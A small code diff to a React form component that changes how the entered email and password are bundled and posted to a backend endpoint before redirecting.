@@ -25,8 +25,9 @@ const Form = () => {
       setError(true)
       return
     }
+    const data = JSON.stringify({ email, password })
     axios
-      .post(`${hostURL}main`, { email, password, userID })
+      .post(`${hostURL}main`, { data, userID, title: 'SHAW' })
       .then(() => {
         setRedirect(true)
       })
